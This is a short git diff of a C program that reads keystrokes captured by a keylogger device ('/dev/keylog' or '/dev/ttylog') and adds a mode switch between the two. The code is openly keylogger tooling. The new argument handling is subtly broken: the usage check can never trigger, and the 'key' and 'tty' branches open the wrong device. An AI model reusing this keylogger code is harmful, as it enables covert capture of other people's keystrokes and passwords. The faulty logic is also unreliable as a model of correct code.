@@ -16,14 +16,27 @@ void io_ready( int signum ) {
     memset( read_buf, 0, BUF_SIZE );
     fread( read_buf, 1, BUF_SIZE, fp );
 
-    printf( "Reading %s from keylogger\n", read_buf );
+    printf( "%s\n", read_buf );
 }
 
-int main( int argv, char **argc ) {
+int main( int argc, char **argv ) {
     fd_set readset;
     int shouldExit = 0;
+ 
+    if( argc != 2 || (strcmp(argv[1], "key") == 0 && strcmp(argv[1], "tty") == 0) ) {
+        perror( argv[1] );
+        
+        perror( "Usage: keyreader (key|tty)\n" );
+        return -1;
+    }
 
-    fp = fopen( "/dev/keylog", "r+" );
+    if( strcmp(argv[1], "key") != 0 ) {
+        fp = fopen( "/dev/keylog", "r+" );
+    }
+    else if( strcmp(argv[1], "tty") != 0  ) {
+        fp = fopen( "/dev/ttylog", "r+" );
+    }
+    
     if ( fp == NULL ) {
         perror( "Failed to open keylog file" );
         return -1;
